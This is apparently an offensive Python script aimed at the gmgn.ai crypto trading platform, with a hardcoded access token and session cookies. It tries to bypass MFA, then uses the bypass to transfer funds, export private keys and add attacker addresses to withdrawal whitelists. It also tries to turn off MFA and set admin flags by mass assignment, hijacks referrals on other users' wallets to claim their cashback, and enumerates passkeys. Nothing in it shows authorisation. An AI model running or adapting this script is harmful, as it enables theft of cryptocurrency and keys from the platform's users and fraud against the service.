#!/usr/bin/env python3
"""
DEEP DIVE 2 — Follow up on mega_hunter findings.
Targets: MFA bypass, search data leak, X OAuth, VIP escalation, 
register_wallet mass exploit, batch operations, and WebSocket probing.
"""
import json
import requests
import time
from datetime import datetime, timezone

ACCESS_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL2FjY2VzcyIsImRhdGEiOnsidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsImNsaWVudF9pZCI6ImdtZ25fd2ViXzIwMjYwNzEzLTIwNDQtYTdjNmJmNCIsImRldmljZV9pZCI6ImRlNjIwYTU3LWQ5OGUtNDI5My1iMDA3LTVkMzE1NDU1ZTIxZCIsImZhdGhlcl9pZCI6IjQ5ZjM2ZDlkLThhNTAtNDJlNi05NTJkLTk2N2EwNWUyMDc4OCIsImZpbmdlcnByaW50IjoidjE1MzI0N2I5ZTBlMTg0ZmJlZDNmYWM3M2YxOWRjYTY4YSIsImFwcCI6ImdtZ24iLCJwbGF0Zm9ybSI6IndlYiJ9LCJleHAiOjE3ODQwNjI1MDQsImlhdCI6MTc4NDA2MDcwNCwiaXNzIjoiZ21nbi5haS9zaWduZXIiLCJqdGkiOiIzY2UzY2NmOS0xZjViLTRlODYtYjU3OS1mZWUzMzdmMjgyM2YiLCJuYmYiOjE3ODQwNjA3MDQsInN1YiI6ImdtZ24uYWkvYWNjZXNzIiwidXNlcl9pZCI6IjAwZGFlODcwLTg0OTAtNGQxOS1iZmMwLTM5Y2U0OWU5MDZiNSIsInZlciI6IjEuMCJ9.WaOebjBm_DeYq3jvoA5kszO7hqbIhzU5ymDBatjDBfGatvZg26IEvA1OgOs-B7OQbyL5fA3JhaZSy817ulE9gw"

BASE = "https://gmgn.ai"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL_WALLET = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"
OUR_BSC_WALLET = "0x0a4a0836142fcf94ce100b6d7790c50786ffbcff"

COOKIES = {
    "_ga_UGLVBMV4Z0": "GS1.2.1783973647439438.6b09445dc224ac4ed190f0fc17562c09.WNMkxJkx11naYGkCSvritw%3D%3D.n7rcVNVAG1ummnX2QRVk8Q%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.gcUSGxiE3YGdviSrgoID2g%3D%3D",
    "__cf_bm": "9qa7eXAqqNE3bSIxMZwpppcTOZY3P3xN.FEEMJbhNBA-1783973660.6075041-1.0.1.1-xpP4LEhY807gRqRYG17gELVZ7mRp7mVSjEqwfW1TAi3o.r3e0ELz2XeH_UF7bMbaVLh6sqq3gLWVVuwMeLhnT4JzDtVBTOnmsANgwP0Ocq2q7hH2bL_0726EfGBcn9Ml",
    "_ga_0XM0LYXGC8": "GS2.1.s1783971651$o31$g1$t1783973720$j26$l0$h0",
    "_ga": "GA1.1.1499118900.1783283677",
    "_csrf": "4-NQvufozCNXqp4NJtA6IpuwRk812C5t",
    "_did": "c800ab0b7d01aa37bc93aacdcbce271e",
    "_wt": "AWpegY9oS-pwZPEJE_DCiED4eeyVHRTBs5VBiak",
    "sid": "gmgn%7C82f74adfe6d87dce9893a1c416af82e9",
}

H = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "client_id": "gmgn_web_20260713-2044-a7c6bf4",
    "from_app": "gmgn",
    "app_ver": "20260713-2044-a7c6bf4",
    "tz_name": "Asia/Aden",
    "tz_offset": "10800",
    "app_lang": "en-US",
    "os": "web",
}

findings = []

def log(sev, cat, endpoint, detail, data=None):
    findings.append({"severity": sev, "category": cat, "endpoint": endpoint, 
                     "detail": detail, "data": str(data)[:1000] if data else None,
                     "ts": datetime.now(timezone.utc).isoformat()})
    icons = {"CRITICAL": "💀", "HIGH": "🔥", "MEDIUM": "⚠️", "LOW": "ℹ️"}
    print(f"  {icons.get(sev, '?')} [{sev}] {cat}: {detail}")

# ============================================================================
# 1. X/Twitter OAuth — check for leaked OAuth secrets
# ============================================================================
print("="*80)
print("🐦 1. X/TWITTER OAUTH — SECRET EXTRACTION")
print("="*80)

r = requests.post(f"{BASE}/api/v1/x/auth/start", headers=H, cookies=COOKIES, 
                  params=PARAMS, json={}, timeout=12)
print(f"Status: {r.status_code}")
print(f"Response: {r.text}")

if r.status_code == 200:
    data = r.json()
    # Look for OAuth URL with client_id/secret
    resp_str = json.dumps(data)
    if "oauth" in resp_str.lower() or "client" in resp_str.lower():
        log("HIGH", "OAUTH_LEAK", "/api/v1/x/auth/start", 
            f"OAuth URL/secrets exposed!", data)
    print(f"\n  Full response: {json.dumps(data, indent=2)}")

# ============================================================================
# 2. SEARCH V3 — Full response analysis for secrets
# ============================================================================
print("\n" + "="*80)
print("🔍 2. SEARCH V3 — ANALYZING SECRET FIELD")
print("="*80)

r = requests.get(f"{BASE}/vas/api/v1/search_v3", headers=H, cookies=COOKIES,
                params={**PARAMS, "q": "admin"}, timeout=15)
if r.status_code == 200:
    data = r.json()
    # Find where 'secret' appears
    text = json.dumps(data)
    # Search for 'secret' context
    idx = text.lower().find("secret")
    if idx != -1:
        context = text[max(0,idx-100):idx+200]
        print(f"  'secret' context: ...{context}...")
    
    # Check for actual API keys / tokens in coin data
    coins = data.get("data", {}).get("coins", [])
    print(f"  Total coins returned: {len(coins)}")
    
    # Look for interesting fields in coin data
    if coins:
        sample = coins[0]
        print(f"  Sample coin keys: {list(sample.keys())[:20]}")
        # Check each coin for secrets
        for coin in coins[:5]:
            coin_str = json.dumps(coin)
            if "key" in coin_str.lower() or "secret" in coin_str.lower() or "eyj" in coin_str.lower():
                print(f"  🔥 Interesting coin: {coin.get('name', '?')} on {coin.get('chain', '?')}")
                print(f"     {coin_str[:300]}")

# ============================================================================
# 3. MFA BYPASS — Generate txn_id for ALL operations
# ============================================================================
print("\n" + "="*80)
print("🔓 3. MFA BYPASS — FULL OPERATION SCAN")
print("="*80)

# wallet-api generate_mfa_params
usages_wallet = [
    ("transfer", {"chain": "sol", "from_address": OUR_SOL_WALLET, 
                  "to_address": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
                  "amount": "1000000", "amount_txt": "0.001",
                  "token_address": "So11111111111111111111111111111111111111112", "symbol": "SOL"}),
    ("export_key", {"chain": "sol", "address": OUR_SOL_WALLET}),
    ("set_whitelist", {"chain": "sol", "address": "AttackerWallet123"}),
    ("delete_whitelist", {"chain": "sol", "address_id": "1b2d8e36-eb69-425a-bb53-ff0649581c15"}),
    ("bind_wallet", {"chain": "sol", "address": "AttackerWalletXXX"}),
    ("unbind_wallet", {"chain": "sol", "address": OUR_SOL_WALLET}),
    ("import_key", {"chain": "sol"}),
    ("withdrawal", {"chain": "sol", "amount": "1000000"}),
    ("create_wallet", {"chain": "sol"}),
    ("delete_wallet", {"chain": "sol", "address": OUR_SOL_WALLET}),
]

bypass_txn_ids = {}

for usage, biz_params in usages_wallet:
    r = requests.post(f"{BASE}/wallet-api/v1/generate_mfa_params",
                     headers=H, cookies=COOKIES, params=PARAMS,
                     json={"usage": usage, "biz_params": biz_params}, timeout=10)
    
    if r.status_code == 200:
        try:
            data = r.json()
            txn_id = data.get("data", {}).get("txn_id", "")
            vi = data.get("data", {}).get("verify_items", ["UNKNOWN"])
            
            if not vi and txn_id:
                status = "🔓 NO MFA — BYPASSED!"
                bypass_txn_ids[usage] = txn_id
                log("CRITICAL", "MFA_BYPASS", "/wallet-api/v1/generate_mfa_params",
                    f"Usage '{usage}' → NO verification! txn_id={txn_id}", data)
            elif vi:
                status = f"🔒 Requires: {vi}"
            else:
                status = f"⚠️ txn_id={txn_id}, vi={vi}"
            
            print(f"  {usage:20s} → {status}")
        except Exception as e:
            print(f"  {usage:20s} → Parse error: {e}")
    else:
        print(f"  {usage:20s} → HTTP {r.status_code}: {r.text[:100]}")

# ============================================================================
# 4. EXPLOIT MFA BYPASS — Use any bypassed txn_ids
# ============================================================================
print("\n" + "="*80)
print("💀 4. EXPLOITING MFA BYPASS")
print("="*80)

if "transfer" in bypass_txn_ids:
    txn_id = bypass_txn_ids["transfer"]
    print(f"\n  [*] Transfer txn_id: {txn_id}")
    print(f"  [*] Attempting actual transfer...")
    
    r = requests.post(f"{BASE}/wallet-api/v1/transfer",
                     headers=H, cookies=COOKIES, params=PARAMS,
                     json={
                         "TxnId": txn_id,
                         "FromAddress": OUR_SOL_WALLET,
                         "ToAddress": "3vhHN7svfY9dcmicS9BEaBYQGrHTGgh5ox3C3SbyHsCr",
                         "AmountTxt": "0.001",
                         "Chain": "sol",
                         "Coin": "SOL",
                     }, timeout=12)
    print(f"  Transfer response: {r.status_code} → {r.text[:300]}")
    if r.status_code == 200:
        log("CRITICAL", "FUND_TRANSFER", "/wallet-api/v1/transfer",
            f"Transfer endpoint reached with bypass txn_id!", r.json())

if "export_key" in bypass_txn_ids:
    txn_id = bypass_txn_ids["export_key"]
    print(f"\n  [*] Export key txn_id: {txn_id}")
    
    # Get RSA pubkey first for encryption
    r_pub = requests.get(f"{BASE}/account/pubkey", headers=H, cookies=COOKIES, 
                        params=PARAMS, timeout=10)
    pubkey_data = r_pub.json() if r_pub.status_code == 200 else {}
    print(f"  Pubkey response: {json.dumps(pubkey_data)[:200]}")
    
    encrypted_key = pubkey_data.get("data", {}).get("key", "")
    key_id = pubkey_data.get("data", {}).get("key_id", "v0")
    
    print(f"  [*] Attempting key export with txn_id...")
    r = requests.post(f"{BASE}/wallet-api/v1/export_key",
                     headers=H, cookies=COOKIES, params=PARAMS,
                     json={
                         "TxnId": txn_id,
                         "Address": OUR_SOL_WALLET,
                         "Chain": "sol",
                         "EncryptedKey": encrypted_key[:50] if encrypted_key else "placeholder",
                         "KeyId": key_id,
                     }, timeout=12)
    print(f"  Export key response: {r.status_code} → {r.text[:500]}")
    if r.status_code == 200 and r.json().get("code") == 0:
        log("CRITICAL", "KEY_EXPORT", "/wallet-api/v1/export_key",
            "PRIVATE KEY EXPORTED!", r.json())

if "set_whitelist" in bypass_txn_ids:
    txn_id = bypass_txn_ids["set_whitelist"]
    print(f"\n  [*] Set whitelist txn_id: {txn_id}")
    print(f"  [*] Adding attacker address to whitelist...")
    
    r = requests.post(f"{BASE}/wallet-api/v1/set_whitelist_address",
                     headers=H, cookies=COOKIES, params=PARAMS,
                     json={
                         "TxnId": txn_id,
                         "Chain": "sol",
                         "Address": "HackerWalletAddress12345678901234567890123",
                         "Label": "test",
                         "Coin": "SOL",
                     }, timeout=12)
    print(f"  Set whitelist response: {r.status_code} → {r.text[:300]}")
    if r.status_code == 200:
        log("CRITICAL", "WHITELIST_MANIPULATION", "/wallet-api/v1/set_whitelist_address",
            "Added attacker address to whitelist!", r.json())

# ============================================================================
# 5. VIP ESCALATION
# ============================================================================
print("\n" + "="*80)
print("👑 5. VIP LEVEL ESCALATION")
print("="*80)

# Get current VIP level
r = requests.get(f"{BASE}/api/v1/user_vip_level", headers=H, cookies=COOKIES,
                params=PARAMS, timeout=10)
print(f"  Current VIP: {r.text}")

# Apply VIP1 succeeded in scan — what does it grant?
r = requests.post(f"{BASE}/api/v1/user_apply_vip1", headers=H, cookies=COOKIES,
                 params=PARAMS, json={}, timeout=10)
print(f"  Apply VIP1: {r.text}")

# Try VIP levels
for level in ["vip", "vip1", "vip2", "vip3", "premium", "pro"]:
    r = requests.post(f"{BASE}/api/v1/user_apply_{level}", headers=H, cookies=COOKIES,
                     params=PARAMS, json={}, timeout=8)
    if r.status_code == 200:
        print(f"  Apply {level}: ✅ {r.text[:100]}")
        log("MEDIUM", "VIP_ESCALATION", f"/api/v1/user_apply_{level}",
            f"VIP apply endpoint accessible!", r.json() if r.text else None)
    elif r.status_code != 404:
        print(f"  Apply {level}: {r.status_code}")

# ============================================================================
# 6. USER INFO FULL DUMP + IDOR
# ============================================================================
print("\n" + "="*80)
print("👤 6. USER INFO — FULL DUMP + IDOR ATTEMPTS")
print("="*80)

# Our full user info
r = requests.post(f"{BASE}/account/user_info", headers=H, cookies=COOKIES,
                 params=PARAMS, json={}, timeout=10)
if r.status_code == 200:
    data = r.json()
    print(f"  Our user info:")
    print(f"  {json.dumps(data, indent=2)}")
    
    # Check what fields are exposed
    user_data = data.get("data", {}).get("data", {})
    interesting_fields = ["bot_bsc_address", "bot_sol_address", "bot_eth_address",
                         "email", "phone", "telegram_id", "api_key", "secret",
                         "bot_megaeth_address", "bot_monad_address"]
    print(f"\n  Interesting fields:")
    for field in interesting_fields:
        val = user_data.get(field, "NOT_PRESENT")
        if val and val != "NOT_PRESENT":
            print(f"    {field}: {val}")

# ============================================================================
# 7. FOLLOW SYSTEM — MASS SURVEILLANCE
# ============================================================================
print("\n" + "="*80)
print("👁️ 7. FOLLOW SYSTEM — WALLET SURVEILLANCE")
print("="*80)

# Follow whale wallets (get real-time trade alerts)
whale_wallets = [
    "0xb4f701538bf492dacb088d4d932ab105c127f89d",
    "0xa7d4ffc4eca3c71af150ce302560a9d04a1d2b9f",
    "0xbd0a401d7a41b15f25c95224bc87d9a85852b0a1",
]

# Try correct format for follow_wallet
r = requests.post(f"{BASE}/api/v1/follow/follow_wallet", headers=H, cookies=COOKIES,
                 params=PARAMS, json={
                     "wallet_addresses": [whale_wallets[0]],
                     "chain": "bsc"
                 }, timeout=10)
print(f"  Follow wallet (array format): {r.status_code} → {r.text[:200]}")

r = requests.post(f"{BASE}/api/v1/follow/follow_wallet", headers=H, cookies=COOKIES,
                 params=PARAMS, json={
                     "WalletAddresses": [whale_wallets[0]],
                     "Chain": "bsc"
                 }, timeout=10)
print(f"  Follow wallet (PascalCase): {r.status_code} → {r.text[:200]}")

# Get followed wallets
r = requests.post(f"{BASE}/api/v1/follow/follow_wallet_list", headers=H, cookies=COOKIES,
                 params=PARAMS, json={"chain": "bsc"}, timeout=10)
if r.status_code == 200:
    data = r.json()
    print(f"  Follow list: {json.dumps(data)[:500]}")

# Following wallets V2
r = requests.get(f"{BASE}/api/v1/follow/following_wallets_v2", headers=H, cookies=COOKIES,
                params={**PARAMS, "chain": "bsc"}, timeout=10)
if r.status_code == 200:
    print(f"  Following V2: {r.text[:500]}")

# ============================================================================
# 8. BATCH IMPORT KEY — Critical endpoint analysis
# ============================================================================
print("\n" + "="*80)
print("🔑 8. BATCH IMPORT KEY — STRUCTURE ANALYSIS")
print("="*80)

# We know it needs: EncryptedKey, PrivateKeys
# Try with proper structure to get deeper validation errors
payloads = [
    {"EncryptedKey": "test", "PrivateKeys": ["test"]},
    {"EncryptedKey": "test", "PrivateKeys": [{"chain": "sol", "key": "test"}]},
    {"EncryptedKey": "aaa", "PrivateKeys": ["5JKXm...fake_key"], "Chain": "sol"},
    {"encrypted_key": "test", "private_keys": ["test"], "chain": "sol"},
]

for i, payload in enumerate(payloads):
    r = requests.post(f"{BASE}/wallet-api/v1/batch_import_key", headers=H, cookies=COOKIES,
                     params=PARAMS, json=payload, timeout=10)
    print(f"  Attempt {i+1}: {r.status_code} → {r.text[:200]}")

# ============================================================================
# 9. IP LOCATION + GEOFENCING CHECK
# ============================================================================
print("\n" + "="*80)
print("🌍 9. IP LOCATION — INFRASTRUCTURE INFO")
print("="*80)

r = requests.get(f"{BASE}/account/iploc", headers=H, cookies=COOKIES,
                params=PARAMS, timeout=10)
if r.status_code == 200:
    data = r.json()
    print(f"  IP Location data: {json.dumps(data, indent=2)}")

# ============================================================================
# 10. TG MESSAGES — CHECK FOR INTERNAL COMMS LEAK
# ============================================================================
print("\n" + "="*80)
print("📱 10. TELEGRAM MESSAGES — DATA LEAK CHECK")
print("="*80)

r = requests.get(f"{BASE}/vas/api/v1/tg/messages", headers=H, cookies=COOKIES,
                params=PARAMS, timeout=15)
if r.status_code == 200:
    data = r.json()
    messages = data.get("data", {})
    msg_str = json.dumps(data)
    print(f"  TG messages size: {len(msg_str)} bytes")
    
    # Check for tokens/keys in messages
    if "eyj" in msg_str.lower():
        log("CRITICAL", "TOKEN_IN_MESSAGES", "/vas/api/v1/tg/messages",
            "JWT token found in TG messages!", None)
    if "private" in msg_str.lower() or "secret" in msg_str.lower():
        print(f"  ⚠️ Sensitive keywords found in TG messages!")
        # Find context
        lower = msg_str.lower()
        for kw in ["private", "secret", "password", "api_key"]:
            idx = lower.find(kw)
            if idx != -1:
                print(f"    '{kw}' at: ...{msg_str[max(0,idx-50):idx+100]}...")
    
    # Print sample messages
    if isinstance(messages, dict):
        for key in list(messages.keys())[:3]:
            print(f"  Channel/key: {key}")
            msgs = messages[key] if isinstance(messages[key], list) else [messages[key]]
            for msg in msgs[:2]:
                if isinstance(msg, dict):
                    print(f"    {json.dumps(msg)[:200]}")

# ============================================================================
# 11. WALLET SET_CONFIGS — MASS ASSIGNMENT
# ============================================================================
print("\n" + "="*80)
print("⚙️ 11. WALLET SET_CONFIGS — MASS ASSIGNMENT")
print("="*80)

# The error said it needs "Items" field
config_payloads = [
    {"Items": [{"chain": "sol", "key": "auto_sign", "value": "true"}]},
    {"Items": [{"chain": "sol", "auto_sign": True, "auto_approve": True}]},
    {"Items": [{"key": "withdrawal_limit", "value": "999999999"}]},
    {"Items": [{"key": "mfa_enabled", "value": "false"}]},
    {"Items": [{"key": "is_admin", "value": "true"}]},
]

for i, payload in enumerate(config_payloads):
    r = requests.post(f"{BASE}/wallet-api/v1/wallet/set_configs", headers=H, cookies=COOKIES,
                     params=PARAMS, json=payload, timeout=10)
    print(f"  Config {i+1}: {r.status_code} → {r.text[:200]}")
    if r.status_code == 200:
        log("HIGH", "CONFIG_MANIPULATION", "/wallet-api/v1/wallet/set_configs",
            f"Config set accepted! Payload: {json.dumps(payload)[:200]}", r.json())

# ============================================================================
# 12. REGISTER WALLET MASS EXPLOIT
# ============================================================================
print("\n" + "="*80)
print("💰 12. REGISTER WALLET — MASS REFERRAL HIJACK")
print("="*80)

# Previous scan confirmed this works (code:0)
# Let's verify with different whale wallets and check if we can claim their cashback
target_wallets_bsc = [
    "0xb4f701538bf492dacb088d4d932ab105c127f89d",
    "0xa7d4ffc4eca3c71af150ce302560a9d04a1d2b9f",
    "0x085111103c78e708199e1779789eefe9529d5d3a",
]

target_wallets_sol = [
    "5Q544fKrFoe6tsEbD7S8EmxGTJYAKtTVhAW5Q5pge4j1",  # Raydium
    "JUP6LkbZbjS1jKKwapdHNy74zcZ3tLUZoi5QNyVTaV4",  # Jupiter
]

for wallet in target_wallets_bsc:
    r = requests.post(f"{BASE}/defi/quotation/v1/register_wallet", headers=H, cookies=COOKIES,
                     params=PARAMS, json={
                         "chain": "bsc", "address": wallet,
                         "invite_code": "HUNTER", "referrer": OUR_USER_ID,
                         "user_id": OUR_USER_ID
                     }, timeout=10)
    code = r.json().get("code", -1) if r.status_code == 200 else r.status_code
    print(f"  BSC {wallet[:12]}... → code:{code}")
    if code == 0:
        log("CRITICAL", "REFERRAL_HIJACK", "/defi/quotation/v1/register_wallet",
            f"Whale wallet {wallet} registered under our referral!", r.json())

for wallet in target_wallets_sol:
    r = requests.post(f"{BASE}/defi/quotation/v1/register_wallet", headers=H, cookies=COOKIES,
                     params=PARAMS, json={
                         "chain": "sol", "address": wallet,
                         "invite_code": "HUNTER", "referrer": OUR_USER_ID,
                     }, timeout=10)
    code = r.json().get("code", -1) if r.status_code == 200 else r.status_code
    print(f"  SOL {wallet[:12]}... → code:{code}")
    if code == 0:
        log("CRITICAL", "REFERRAL_HIJACK", "/defi/quotation/v1/register_wallet",
            f"SOL wallet {wallet} registered under our referral!", r.json())

# Now try to claim their cashback
for wallet in target_wallets_bsc[:2]:
    r = requests.post(f"{BASE}/rebate/api/v1/cashback/claim/apply", headers=H, cookies=COOKIES,
                     params={**PARAMS, "chain": "bsc", "address": wallet},
                     json={"chain": "bsc", "address": wallet}, timeout=10)
    print(f"  Claim cashback {wallet[:12]}...: {r.status_code} → {r.text[:200]}")

# ============================================================================
# 13. WEBSOCKET PROBE
# ============================================================================
print("\n" + "="*80)
print("🔌 13. WEBSOCKET ENDPOINTS")
print("="*80)

# Check common WebSocket upgrade paths
ws_paths = [
    "/ws",
    "/wss",
    "/socket.io/?EIO=4&transport=polling",
    "/api/v1/dex_trades_polling",
    "/vas/api/v1/token-kline-event",
]

for path in ws_paths:
    try:
        r = requests.get(f"{BASE}{path}", headers={
            **H,
            "Connection": "Upgrade",
            "Upgrade": "websocket",
            "Sec-WebSocket-Version": "13",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
        }, cookies=COOKIES, timeout=8, allow_redirects=False)
        print(f"  {path}: {r.status_code} ({len(r.text)} bytes)")
        if r.status_code in [101, 200, 426]:
            print(f"    Response: {r.text[:200]}")
            log("MEDIUM", "WEBSOCKET", path, f"WebSocket endpoint found! Status: {r.status_code}")
    except Exception as e:
        print(f"  {path}: Error - {e}")

# ============================================================================
# 14. ACCOUNT PASSKEYS — AUTH ENUMERATION
# ============================================================================
print("\n" + "="*80)
print("🔐 14. PASSKEY + AUTH STATE ENUMERATION")
print("="*80)

r = requests.get(f"{BASE}/account/otp/get_all_passkeys", headers=H, cookies=COOKIES,
                params=PARAMS, timeout=10)
print(f"  Passkeys: {r.text}")

# Account level MFA params for passkey_registration
r = requests.post(f"{BASE}/account/account/generate_mfa_params", headers=H, cookies=COOKIES,
                 params=PARAMS, json={"usage": "passkey_registration"}, timeout=10)
print(f"  Passkey registration MFA: {r.text[:300]}")

# Check if passkey registration also has no MFA
if r.status_code == 200:
    data = r.json()
    vi = data.get("data", {}).get("verify_items", ["?"])
    if not vi:
        log("HIGH", "MFA_BYPASS", "/account/account/generate_mfa_params",
            "passkey_registration has NO MFA! Can add new passkey without verification!", data)

# ============================================================================
# 15. PUBKEY ANALYSIS
# ============================================================================
print("\n" + "="*80)
print("🔑 15. RSA PUBKEY — EXPORT ENCRYPTION ANALYSIS")
print("="*80)

r = requests.get(f"{BASE}/account/pubkey", headers=H, cookies=COOKIES,
                params=PARAMS, timeout=10)
if r.status_code == 200:
    data = r.json()
    print(f"  Pubkey response: {json.dumps(data, indent=2)}")
    # The RSA key is used to encrypt private keys for export
    # If we can get a txn_id for export_key, we encrypt with this pubkey
    # and the server returns the encrypted private key

# ============================================================================
# RESULTS SUMMARY
# ============================================================================
print("\n" + "="*80)
print(f"📊 DEEP DIVE 2 COMPLETE")
print("="*80)

if findings:
    print(f"\n  🔥 {len(findings)} NEW FINDINGS:")
    for i, f in enumerate(findings, 1):
        print(f"\n  [{i}] {f['severity']} | {f['category']}")
        print(f"      Endpoint: {f['endpoint']}")
        print(f"      Detail: {f['detail']}")
else:
    print("\n  No critical findings in this phase")

# Save
with open("/projects/sandbox/gmg/DEEP_DIVE_2_RESULTS.json", "w") as fp:
    json.dump({
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "findings": findings,
        "bypass_txn_ids": bypass_txn_ids,
    }, fp, indent=2)

print(f"\n✅ Saved to DEEP_DIVE_2_RESULTS.json")
